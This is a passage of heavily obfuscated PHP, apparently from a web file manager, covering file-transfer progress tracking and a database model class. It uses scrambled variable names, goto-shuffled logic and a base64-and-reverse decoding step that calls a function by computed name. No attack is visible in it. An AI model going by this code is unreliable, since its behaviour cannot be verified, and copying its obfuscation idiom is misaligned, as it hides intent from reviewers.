Model($FÊ¡ÈÊëÄ¯[416])->where(array($FÊ¡ÈÊëÄ¯[92] => $fĞ‚¶Œ’ÑÔ, $FÊ¡ÈÊëÄ¯[29] => $FÊ¡ÈÊëÄ¯[1524]))->delete(); } $AŠ±²—×ù¥ = json_encode($a‘ÕÙá™¥–); goto bğ±áôùæ›; bğ±áôùæ›: if (!$AŠ±²—×ù¥) { ob_start(); var_dump($a‘ÕÙá™¥–); $Bµ‰Ÿ±í´Ÿ = ob_get_clean(); self::log($FÊ¡ÈÊëÄ¯[1525] . json_encode_force($Bµ‰Ÿ±í´Ÿ)); } if (!$fĞ‚¶Œ’ÑÔ || !$a‘ÕÙá™¥–[$FÊ¡ÈÊëÄ¯[385]]) { return !1; } $cØÕŠƒÍ„õ = array($FÊ¡ÈÊëÄ¯[29] => $FÊ¡ÈÊëÄ¯[1524], $FÊ¡ÈÊëÄ¯[1502] => USER_ID, $FÊ¡ÈÊëÄ¯[92] => $fĞ‚¶Œ’ÑÔ, $FÊ¡ÈÊëÄ¯[368] => $AŠ±²—×ù¥); goto f‘å¢Ëô£Î; b‡î–ÅàÈ•: } public static function log($DİÂáîæå–) { write_log($DİÂáîæå–, $_SERVER[Æ¼ôºÙï][1526]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto eÅÈ¥¾°‘ø; fóˆÎÛğõ…: Hook::bind($ašÍ„ó™¶é[1539], array($this, $ašÍ„ó™¶é[1540])); Hook::bind($ašÍ„ó™¶é[1541], array($this, $ašÍ„ó™¶é[1542])); Hook::bind($ašÍ„ó™¶é[1543], array($this, $ašÍ„ó™¶é[1544])); goto C›®º°øå; C›®º°øå: $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1545]] = LNG($ašÍ„ó™¶é[1546]); $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1547]] = 0; $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1548]] = 0; goto c¦ÃÎÓÏò; c¦ÃÎÓÏò: $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1002]] = $ašÍ„ó™¶é[33]; $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1549]] = $ašÍ„ó™¶é[33]; $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1550]] = 0; goto D‘êÛİ‚…˜; eÅÈ¥¾°‘ø: $ašÍ„ó™¶é =& $_SERVER[Æ¼ôºÙï]; $bÄ®Š–ÆÓ… =& $this->task; $this->sourceCopyFolder = !1; goto bÖ“ã¬ø£‰; Eª“©²Á: Hook::bind($ašÍ„ó™¶é[528], array($this, $ašÍ„ó™¶é[1535])); Hook::bind($ašÍ„ó™¶é[530], array($this, $ašÍ„ó™¶é[1535])); Hook::bind($ašÍ„ó™¶é[532], array($this, $ašÍ„ó™¶é[1535])); goto F¾‡çÁôö½; e»ãª ßƒ‰: Hook::bind($ašÍ„ó™¶é[555], array($this, $ašÍ„ó™¶é[1532])); Hook::bind($ašÍ„ó™¶é[556], array($this, $ašÍ„ó™¶é[1533])); Hook::bind($ašÍ„ó™¶é[558], array($this, $ašÍ„ó™¶é[1534])); goto CÏôÚÏ¾ˆ§; bÖ“ã¬ø£‰: Hook::bind($ašÍ„ó™¶é[1527], array($this, $ašÍ„ó™¶é[1528])); Hook::bind($ašÍ„ó™¶é[1088], array($this, $ašÍ„ó™¶é[1529])); Hook::bind($ašÍ„ó™¶é[1530], array($this, $ašÍ„ó™¶é[1531])); goto e»ãª ßƒ‰; CÏôÚÏ¾ˆ§: Hook::bind($ašÍ„ó™¶é[559], array($this, $ašÍ„ó™¶é[1534])); Hook::bind($ašÍ„ó™¶é[526], array($this, $ašÍ„ó™¶é[1535])); Hook::bind($ašÍ„ó™¶é[523], array($this, $ašÍ„ó™¶é[1535])); goto Eª“©²Á; D‘êÛİ‚…˜: $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1551]] = 0; $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1552]] = 0; if (!$bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1407]]) { $bÄ®Š–ÆÓ…[$ašÍ„ó™¶é[1407]] = LNG($ašÍ„ó™¶é[1553]); } goto B·àœ•æ²ë; F¾‡çÁôö½: Hook::bind($ašÍ„ó™¶é[1536], array($this, $ašÍ„ó™¶é[1537])); Hook::bind($ašÍ„ó™¶é[548], array($this, $ašÍ„ó™¶é[1538])); $this->sourceModelCopyFlag = !1; goto fóˆÎÛğõ…; B·àœ•æ²ë: } protected function endAfter() { goto e¡Ä¯£Á®È; e¡Ä¯£Á®È: $f²ñà¥³òº =& $_SERVER[Æ¼ôºÙï]; Hook::unbind($f²ñà¥³òº[1527], array($this, $f²ñà¥³òº[1528])); Hook::unbind($f²ñà¥³òº[1088], array($this, $f²ñà¥³òº[1529])); goto Eéãâ¦îô‘; a¥¾Ÿì”“: Hook::unbind($f²ñà¥³òº[1539], array($this, $f²ñà¥³òº[1540])); Hook::unbind($f²ñà¥³òº[1541], array($this, $f²ñà¥³òº[1542])); Hook::unbind($f²ñà¥³òº[1543], array($this, $f²ñà¥³òº[1544])); goto b…£Ú°Û¾³; eÚÉÀÂ¼ë¤: Hook::unbind($f²ñà¥³òº[532], array($this, $f²ñà¥³òº[1535])); Hook::unbind($f²ñà¥³òº[1536], array($this, $f²ñà¥³òº[1537])); Hook::unbind($f²ñà¥³òº[548], array($this, $f²ñà¥³òº[1538])); goto a¥¾Ÿì”“; Aš×¹Ş·à: Hook::unbind($f²ñà¥³òº[558], array($this, $f²ñà¥³òº[1534])); Hook::unbind($f²ñà¥³òº[559], array($this, $f²ñà¥³òº[1534])); Hook::unbind($f²ñà¥³òº[526], array($this, $f²ñà¥³òº[1535])); goto bè‡ÊµÎÔŠ; Eéãâ¦îô‘: Hook::unbind($f²ñà¥³òº[1530], array($this, $f²ñà¥³òº[1531])); Hook::unbind($f²ñà¥³òº[555], array($this, $f²ñà¥³òº[1532])); Hook::unbind($f²ñà¥³òº[556], array($this, $f²ñà¥³òº[1533])); goto Aš×¹Ş·à; bè‡ÊµÎÔŠ: Hook::unbind($f²ñà¥³òº[523], array($this, $f²ñà¥³òº[1535])); Hook::unbind($f²ñà¥³òº[528], array($this, $f²ñà¥³òº[1535])); Hook::unbind($f²ñà¥³òº[530], array($this, $f²ñà¥³òº[1535])); goto eÚÉÀÂ¼ë¤; b…£Ú°Û¾³: } public function copyMoveStart($fÆ¡ôì´†î, $Có³ŸŞÉ‰Ú, $D·ğ¢Êæ³ì, $bÒ­µÜàÒ) { goto CÎ÷ã……¦; DÜ‘Î˜»ç: $aíîÜÀƒ˜[$aÆ“ËÑ”ÌÇ[1555]] = KodIO::transferType($fÆ¡ôì´†î, $D·ğ¢Êæ³ì); $this->update(); goto BİÍø¹œ¶; b«™îºµÜ¨: if (substr($Có³ŸŞÉ‰Ú, 0, strlen($cÖÚ°µ§˜ª)) == $cÖÚ°µ§˜ª) { return; } if (substr($bÒ­µÜàÒ, 0, strlen($cÖÚ°µ§˜ª)) == $cÖÚ°µ§˜ª) { return; } $aíîÜÀƒ˜ =& $this->task; goto DÜ‘Î˜»ç; CÎ÷ã……¦: $aÆ“ËÑ”ÌÇ =& $_SERVER[Æ¼ôºÙï]; self::log($aÆ“ËÑ”ÌÇ[1554] . $Có³ŸŞÉ‰Ú . $aÆ“ËÑ”ÌÇ[66] . $bÒ­µÜàÒ); $cÖÚ°µ§˜ª = rtrim(TEMP_FILES, $aÆ“ËÑ”ÌÇ[8]); goto b«™îºµÜ¨; BİÍø¹œ¶: } public function updateAfter() { goto bİêÌñ‚ö; fÎ†Ü£‚İê: $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1503]] = $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1552]] / $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[717]]; if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1503]] > 0) { $cÔˆáäæëè = timeFloat() - $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1505]] - $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1508]]; $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1509]] = $cÔˆáäæëè * (1 - $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1503]]) / $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1503]]; } goto d»Ô©ğİ¦ğ; bİêÌñ‚ö: $BÃ„ÅÏ¶ãê =& $_SERVER[Æ¼ôºÙï]; $BÔ˜ Ø‘ƒë =& $this->task; if (!$BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[717]]) { return; } goto B‘åŒëŠ˜·; B‘åŒëŠ˜·: if ($this->sourceModelCopyFlag) { return; } if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1555]] == $BÃ„ÅÏ¶ãê[1159]) { return; } if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1555]] == $BÃ„ÅÏ¶ãê[1073] || $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1555]] == $BÃ„ÅÏ¶ãê[106]) { if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1549]]) { $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1552]] = $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1551]] + $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1548]]; } } else { if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1555]] == $BÃ„ÅÏ¶ãê[1160]) { if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1549]] == $BÃ„ÅÏ¶ãê[1073]) { $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1552]] = $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1551]] + $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1548]] * 0.5; } else { if ($BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1549]] == $BÃ„ÅÏ¶ãê[106]) { $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1552]] = $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1551]] + $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1547]] * 0.5 + $BÔ˜ Ø‘ƒë[$BÃ„ÅÏ¶ãê[1548]] * 0.5; } } } } goto fÎ†Ü£‚İê; d»Ô©ğİ¦ğ: } public function addPath($eïÚêÇã‚) { goto C®‘Ü‡ÃõÔ; C®‘Ü‡ÃõÔ: $fòÆ¨‰ÄÑó =& $_SERVER[Æ¼ôºÙï]; if (!$eïÚêÇã‚) { return; } $FÇî‘¯¦‚„ =& $this->task; goto A¨æ¾’Ó; A¨æ¾’Ó: $cÓ’…¥­¢ = IO::infoWithChildren($eïÚêÇã‚); $eíÁÍæéœ¦ = $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1556]] ? $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1556]][$fòÆ¨‰ÄÑó[1557]] : 0; $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1556]] = array($fòÆ¨‰ÄÑó[1557] => $eíÁÍæéœ¦ + 1, $fòÆ¨‰ÄÑó[404] => $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[28]], $fòÆ¨‰ÄÑó[75] => $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[75]], $fòÆ¨‰ÄÑó[484] => $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[484]] ? $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[484]] : $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[75]]); goto AëÛÍ×Î; AëÛÍ×Î: if ($cÓ’…¥­¢[$fòÆ¨‰ÄÑó[29]] == $fòÆ¨‰ÄÑó[173]) { $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1000]] += 1; } else { $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1000]] += $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[80]][$fòÆ¨‰ÄÑó[78]]; if ($cÓ’…¥­¢[$fòÆ¨‰ÄÑó[387]]) { $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[1000]] += $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[80]][$fòÆ¨‰ÄÑó[79]] + 1; } } $FÇî‘¯¦‚„[$fòÆ¨‰ÄÑó[717]] += $cÓ’…¥­¢[$fòÆ¨‰ÄÑó[77]]; $this->update(); goto c§·Î¯ï ï; c§·Î¯ï ï: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($e‡´¶İØ®¾) { $b¤¼ÍËìå =& $_SERVER[Æ¼ôºÙï]; $dµŞ’šƒ­ =& $this->task; $dµŞ’šƒ­[$b¤¼ÍËìå[1545]] = $e‡´¶İØ®¾[$b¤¼ÍËìå[28]]; $dµŞ’šƒ­[$b¤¼ÍËìå[1002]] = $e‡´¶İØ®¾[$b¤¼ÍËìå[28]]; $this->update(); } public function copyFileStart($dÃ·†Îœ–Î, $d¯ò‚ÕÀ£, $cŞŒÄ²½·‰, $eçöÍ„ó×, $FÌô¢˜îÍ, $E…™Ö÷£º¸) { goto C–•„ñÇšµ; e‡Ì™²ì˜…: $this->update(); goto dÇì”‹Ÿ¬ ; f³ğ÷¢Ñàô: $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1002]] = $CÊ‚°“àÊ[33]; $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1549]] = $CÊ‚°“àÊ[33]; $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1550]] = 0; goto e‡Ì™²ì˜…; C–•„ñÇšµ: $CÊ‚°“àÊ =& $_SERVER[Æ¼ôºÙï]; $Eó¿Ëˆù°ö = $FÌô¢˜îÍ; if ($Eó¿Ëˆù°ö == $GLOBALS[$CÊ‚°“àÊ[1558]]) { $Eó¿Ëˆù°ö = $GLOBALS[$CÊ‚°“àÊ[1559]]; } goto Eˆñ¿‚˜¦; F¡ö§«ÆÊ…: $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1545]] = $Eó¿Ëˆù°ö; $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1547]] = (int) $dÃ·†Îœ–Î->size($d¯ò‚ÕÀ£); $cğ†ÛóÔ½…[$CÊ‚°“àÊ[1548]] = 0; goto f³ğ÷¢Ñàô; Eˆñ¿‚˜¦: $GLOBALS[$CÊ‚°“àÊ[1559]] = $FÌô¢˜îÍ; $GLOBALS[$CÊ‚°“àÊ[1558]] = $E…™Ö÷£º¸; $cğ†ÛóÔ½… =& $this->task; goto F¡ö§«ÆÊ…; dÇì”‹Ÿ¬ : } public function copyFileEnd($C²²ÒÅ«”, $c·„³Õ£áƒ, $f­ç°İô­È, $a‚¼Ò›×ëè, $Dâ„¥³¡ó, $f¾³·ƒ…Úì) { $F‘ö…ƒå Á =& $_SERVER[Æ¼ôºÙï]; $B‡•ë†Å´æ =& $this->task; $B‡•ë†Å´æ[$F‘ö…ƒå Á[1548]] = $B‡•ë†Å´æ[$F‘ö…ƒå Á[1547]]; $B‡•ë†Å´æ[$F‘ö…ƒå Á[1549]] = $F‘ö…ƒå Á[33]; if ($Dâ„¥³¡ó == $B‡•ë†Å´æ[$F‘ö…ƒå Á[1545]]) { $B‡•ë†Å´æ[$F‘ö…ƒå Á[1551]] += $B‡•ë†Å´æ[$F‘ö…ƒå Á[1547]]; $B‡•ë†Å´æ[$F‘ö…ƒå Á[1552]] = $B‡•ë†Å´æ[$F‘ö…ƒå Á[1551]]; $this->update(1); } else { $this->update(); $B‡•ë†Å´æ[$F‘ö…ƒå Á[1548]] = 0; } self::log($F‘ö…ƒå Á[1560] . $c·„³Õ£áƒ . $F‘ö…ƒå Á[66] . $a‚¼Ò›×ëè . $F‘ö…ƒå Á[227] . $Dâ„¥³¡ó . $F‘ö…ƒå Á[1561] . $B‡•ë†Å´æ[$F‘ö…ƒå Á[1545]]); } public function updateFileEnd($b—½…ÉËÜØ, $a«¢¹»ÔÏ) { goto FŞñÒÁá¯¹; eê©ÑÔŸ—¶: $this->update(1); self::log($AŞŠš©£Î[1562] . $b—½…ÉËÜØ); goto bğè®Ê”ê; FŞñÒÁá¯¹: $AŞŠš©£Î =& $_SERVER[Æ¼ôºÙï]; $FĞßò„ÉÀ =& $this->task; $FĞßò„ÉÀ[$AŞŠš©£Î[1545]] = $b—½…ÉËÜØ; goto bøÁô®’õ; bøÁô®’õ: $FĞßò„ÉÀ[$AŞŠš©£Î[1547]] = $a«¢¹»ÔÏ; $FĞßò„ÉÀ[$AŞŠš©£Î[1551]] += $a«¢¹»ÔÏ; $FĞßò„ÉÀ[$AŞŠš©£Î[1552]] = $FĞßò„ÉÀ[$AŞŠš©£Î[1551]]; goto eê©ÑÔŸ—¶; bğè®Ê”ê: } public function sourceModelCopy($a™ì¯ÕóÎñ) { goto FƒÉÀö÷’Ç; D‡¡èì™Æ: switch ($D—ø¿Üß§¢) { case $bÀ¨Ÿç‹º[524]: $E·È…ˆÑó‹ = 1; break; case $bÀ¨Ÿç‹º[527]: $E“·Ä×©øµ[$bÀ¨Ÿç‹º[1545]] = $f²öÚóƒ¡[$bÀ¨Ÿç‹º[28]]; break; case $bÀ¨Ÿç‹º[529]: $E·È…ˆÑó‹ = intval($a™ì¯ÕóÎñ[$bÀ¨Ÿç‹º[372]] * 0.4); break; case $bÀ¨Ÿç‹º[531]: $E·È…ˆÑó‹ = intval($a™ì¯ÕóÎñ[$bÀ¨Ÿç‹º[372]] * 0.2); break; case $bÀ¨Ÿç‹º[533]: $E·È…ˆÑó‹ = intval($a™ì¯ÕóÎñ[$bÀ¨Ÿç‹º[372]] * 0.4); break; } $this->update($E·È…ˆÑó‹); $this->sourceModelCopyFlag = !1; goto f·‰‚çáà‹; Dô‚ùÏó²®: $E“·Ä×©øµ =& $this->task; $this->sourceModelCopyFlag = !0; $E·È…ˆÑó‹ = 0; goto D‡¡èì™Æ; FƒÉÀö÷’Ç: $bÀ¨Ÿç‹º =& $_SERVER[Æ¼ôºÙï]; $D—ø¿Üß§¢ = $a™ì¯ÕóÎñ[0]; $f²öÚóƒ¡ = $a™ì¯ÕóÎñ[1]; goto Dô‚ùÏó²®; f·‰‚çáà‹: } public function sourceRemove($D÷ °ÇÃ¯, $Bè©„»¢¥) { $C°œ¯²ğğñ =& $_SERVER[Æ¼ôºÙï]; $this->sourceModelCopyFlag = !0; $eù¦È†Ù˜ = 1; if (isset($D÷ °ÇÃ¯[$C°œ¯²ğğñ[80]])) { $eù¦È†Ù˜ = $D÷ °ÇÃ¯[$C°œ¯²ğğñ[80]][$C°œ¯²ğğñ[78]] + $D÷ °ÇÃ¯[$C°œ¯²ğğñ[80]][$C°œ¯²ğğñ[79]] + 1; } $this->update($eù¦È†Ù˜); $this->sourceModelCopyFlag = !1; } public function sourceMove($d‡É©‰ˆßº) { $this->sourceRemove($d‡É©‰ˆßº, !1); } public function curlProgress($A¨÷Ê„•ÖÙ, $CÀÃŠÈÔ§à, $A¦Ê‹£¼“Ò, $Fª³æŸÑÅÓ, $Dì†¸ÜÆï) { $aÙĞİ¼ÅÈ =& $_SERVER[Æ¼ôºÙï]; $C¹…¾Í’ßï =& $this->task; if ($Dì†¸ÜÆï > 0) { $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1002]] = $aÙĞİ¼ÅÈ[1563]; $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1549]] = $aÙĞİ¼ÅÈ[106]; if ($C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1547]]) { $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1548]] = $Dì†¸ÜÆï; } if ($C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1550]]) { $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1548]] = $Dì†¸ÜÆï + $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1550]]; } } else { if ($A¦Ê‹£¼“Ò > 0) { if ($C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1547]] == $CÀÃŠÈÔ§à) { $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1548]] = $A¦Ê‹£¼“Ò; $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1002]] = $aÙĞİ¼ÅÈ[1564]; $C¹…¾Í’ßï[$aÙĞİ¼ÅÈ[1549]] = $aÙĞİ¼ÅÈ[1073]; } } } $this->update(); } public function curlProgressStart($AØ„á¼±ï„) { } public function curlProgressEnd($a†¥ÄÃò¡­) { goto fÂ‰ÊŒ°„©; D…Ã‡…¹«Ú: $AŒ˜—Å£¢„ = $F×‡¼¾ÖŞ‹[$F‰÷®ÈÃÃ[1565]]; if ($AŒ˜—Å£¢„ == -1) { $AŒ˜—Å£¢„ = $F×‡¼¾ÖŞ‹[$F‰÷®ÈÃÃ[1566]]; } if ($fĞã„“–¤[$F‰÷®ÈÃÃ[1549]] == $F‰÷®ÈÃÃ[106] && $AŒ˜—Å£¢„) { $fĞã„“–¤[$F‰÷®ÈÃÃ[1550]] += $AŒ˜—Å£¢„; } goto dÃŸÎ©ÎÌã; dÃŸÎ©ÎÌã: $this->update(); goto a£—×™ŸÊ´; fÂ‰ÊŒ°„©: $F‰÷®ÈÃÃ =& $_SERVER[Æ¼ôºÙï]; $fĞã„“–¤ =& $this->task; $F×‡¼¾ÖŞ‹ = curl_getinfo($a†¥ÄÃò¡­); goto D…Ã‡…¹«Ú; a£—×™ŸÊ´: } } goto f’Í²©‡ƒë; cåï•É‹°: $AŸÑêÆ±İà = strrev(base64_decode($_SERVER[Î][0])); function binCheckNeq($AƒÎ£ó½ÆË, $b™–±Ğù–) { return $AƒÎ£ó½ÆË != $b™–±Ğù–; } $_SERVER[$_SERVER[Î][1]] = $AŸÑêÆ±İà($_SERVER[$_SERVER[Î][2]]); goto c­ÒŞ éÎˆ; E£Şï»ÙºŒ: define($_SERVER[Æ¼ôºÙï][238], 0); define($_SERVER[Æ¼ôºÙï][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\x6f\x72\144\145\x72", "\x61\x6c\151\x61\x73", "\x68\141\166\151\156\147", "\147\x72\x6f\165\160", "\x6c\x6f\143\x6b", "\144\x69\163\164\x69\156\x63\x74", "\x61\x75\x74\157", "\x66\x69\x6c\164\x65\162", "\166\x61\x6c\151\x64\x61\164\x65", "\162\145\163\x75\x6c\164", "\x62\151\156\144", "\164\x6f\153\145\x6e"); public function __construct($f‹¨¼“œ— = '', $fµô·†«‡à = '', $Dëâ …Øƒ¶ = '') { $cÀˆ‰‰‚ƒ” =& $_SERVER[Æ¼ôºÙï]; $this->_initialize(); if (!empty($f‹¨¼“œ—)) { if (strpos($f‹¨¼“œ—, $cÀˆ‰‰‚ƒ”[94])) { list($this->dbName, $this->name) = explode($cÀˆ‰‰‚ƒ”[94], $f‹¨¼“œ—); } else { $this->name = $f‹¨¼“œ—; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($fµô·†«‡à)) { $this->tablePrefix = $cÀˆ‰‰‚ƒ”[33]; } elseif ($cÀˆ‰‰‚ƒ”[33] != $fµô·†«‡à) { $this->tablePrefix = $fµô·†«‡à; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($cÀˆ‰‰‚ƒ”[240]); } $this->db(0, empty($this->connection) ? $Dëâ …Øƒ¶ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eÌ¢¿×ˆÒ² =& $_SERVER[Æ¼ôºÙï]; if (empty($this->fields)) { if (think_config($eÌ¢¿×ˆÒ²[241])) { $dİ­Œ´Œ‰ª = $this->dbName ? $this->dbName : think_config($eÌ¢¿×ˆÒ²[242]); $Dò¦¦´Ä¼ = think_var_cache($eÌ¢¿×ˆÒ²[243] . strtolower(get_path_this($dİ­Œ´Œ‰ª) . $eÌ¢¿×ˆÒ²[94] . $this->name)); if ($Dò¦¦´Ä¼) { $bÈ–Ó¤òøê = think_config($eÌ¢¿×ˆÒ²[244]); if (empty($bÈ–Ó¤òøê) || $Dò¦¦´Ä¼[$eÌ¢¿×ˆÒ²[245]] == $bÈ–Ó¤òøê) { $this->fields = $Dò¦¦´Ä¼; return; } } } $this->flush(); } } public function flush() { goto d–¥Å ğñ·; EÑ‡ºñÏ¦: if (think_config($AæŒõË•„—[241])) { $f±¢†·–ŠÎ = $this->dbName ? $this->dbName : think_config($AæŒõË•„—[242]); think_var_cache($AæŒõË•„—[243] . strtolower(get_path_this($f±¢†·–ŠÎ) . $AæŒõË•„—[94] . $this->name), $this->fields); } goto fŸâ›Öâ; Aï›îæ»¥˜: foreach ($A¸ÖÌ¬ì‚­ as $fì£Ü¢˜½ => $AÄá±Êš) { $AÔˆ‰†Øº[$fì£Ü¢˜½] = $AÄá±Êš[$AæŒõË•„—[29]]; if ($AÄá±Êš[$AæŒõË•„—[36]]) { $this->fields[$AæŒõË•„—[247]] = $fì£Ü¢˜½; if ($AÄá±Êš[$AæŒõË•„—[39]]) { $this->fields[$AæŒõË•„—[246]] = !0; } } } $this->fields[$AæŒõË•„—[248]] = $AÔˆ‰†Øº; if (think_config($AæŒõË•„—[244])) { $this->fields[$AæŒõË•„—[245]] = think_config($AæŒõË•„—[244]); } goto EÑ‡ºñÏ¦; d–¥Å ğñ·: $AæŒõË•„— =& $_SERVER[Æ¼ôºÙï]; $this->db->setModel($this->name); $A¸ÖÌ¬ì‚­ = $this->db->getFields($this->getTableName()); goto FÛ˜øªÅŞ; FÛ˜øªÅŞ: if (!$A¸ÖÌ¬ì‚­) { return !1; } $this->fields = array_keys($A¸ÖÌ¬ì‚­); $this->fields[$AæŒõË•„—[246]] = !1; goto Aï›îæ»¥˜; fŸâ›Öâ: } public function switchModel($CÁõ‘ğÈ©, $CÃ’¹Ëïº = array()) { $bÏ†óİ‚®ë =& $_SERVER[Æ¼ôºÙï]; $Fì—ˆ¸ëìà = ucwords(strtolower($CÁõ‘ğÈ©)) . $bÏ†óİ‚®ë[249]; if (!class_exists($Fì—ˆ¸ëìà)) { think_exception($Fì—ˆ¸ëìà . think_lang($bÏ†óİ‚®ë[250])); } $this->_extModel = new $Fì—ˆ¸ëìà($this->name); if (!empty($CÃ’¹Ëïº)) { foreach ($CÃ’¹Ëïº as $dëé‚Òê‡) { $this->_extModel->setProperty($dëé‚Òê‡, $this->{$dëé‚Òê‡}); } } return $this->_extModel; } public function __set($Dæ’šŞÃ…ß, $c´¥¹‹ìô“) { $this->data[$Dæ’šŞÃ…ß] = $c´¥¹‹ìô“; } public function __get($BŒ·Õ´Á‹) { return isset($this->data[$BŒ·Õ´Á‹]) ? $this->data[$BŒ·Õ´Á‹] : null; } public function __isset($A—ÛÂ³¥‰Ë) { return isset($this->data[$A—ÛÂ³¥‰Ë]); } public function __unset($C•´º¡‰Ì®) { unset($this->data[$C•´º¡‰Ì®]); } public function __call($B‚«šÆ¡‹ˆ, $dŠ£İñ–Æ) { $D¼øù”à‹Í =& $_SERVER[Æ¼ôºÙï]; if (in_array(strtolower($B‚«šÆ¡‹ˆ), $this->methods, !0)) { $this->options[strtolower($B‚«šÆ¡‹ˆ)] = $dŠ£İñ–Æ[0]; return $this; } elseif (in_array(strtolower($B‚«šÆ¡‹ˆ), array($D¼øù”à‹Í[251], $D¼øù”à‹Í[252], $D¼øù”à‹Í[253], $D¼øù”à‹Í[254], $D¼øù”à‹Í[255]), !0)) { $bÈÄ÷ »ÂÚ = isset($dŠ£İñ–Æ[0]) ? $dŠ£İñ–Æ[0] : $D¼øù”à‹Í[182]; $bÈÄ÷ »ÂÚ = $this->db->parseKey($bÈÄ÷ »ÂÚ); return $this->getField(strtoupper($B‚«šÆ¡‹ˆ) . $D¼øù”à‹Í[256] . $bÈÄ÷ »ÂÚ . $D¼øù”à‹Í[257] . $B‚«šÆ¡‹ˆ, $D¼øù”à‹Í[251]); } elseif (strtolower(substr($B‚«šÆ¡‹ˆ, 0, 5)) == $D¼øù”à‹Í[258]) { $bÈÄ÷ »ÂÚ = think_parse_name(substr($B‚«šÆ¡‹ˆ, 5)); $DÁÉÜ”ãÉ[$bÈÄ÷ »ÂÚ] = $dŠ£İñ–Æ[0]; return $this->where($DÁÉÜ”ãÉ)->find(); } elseif (strtolower(substr($B‚«šÆ¡‹ˆ, 0, 10)) == $D¼øù”à‹Í[259]) { $eÓÑÅá÷äœ = think_parse_name(substr($B‚«šÆ¡‹ˆ, 10)); $DÁÉÜ”ãÉ[$eÓÑÅá÷äœ] = $dŠ£İñ–Æ[0]; return $this->where($DÁÉÜ”ãÉ)->getField($dŠ£İñ–Æ[1]); } elseif (isset($this->_scope[$B‚«šÆ¡‹ˆ])) { return $this->scope($B‚«šÆ¡‹ˆ, $dŠ£İñ–Æ[0]); } elseif (method_exists($this, $B‚«šÆ¡‹ˆ)) { array_unshift($dŠ£İñ–Æ, $B‚«šÆ¡‹ˆ); return call_user_func_array(array($this, $D¼øù”à‹Í[260]), $dŠ£İñ–Æ); } else { return call_user_func_array(array(parent, 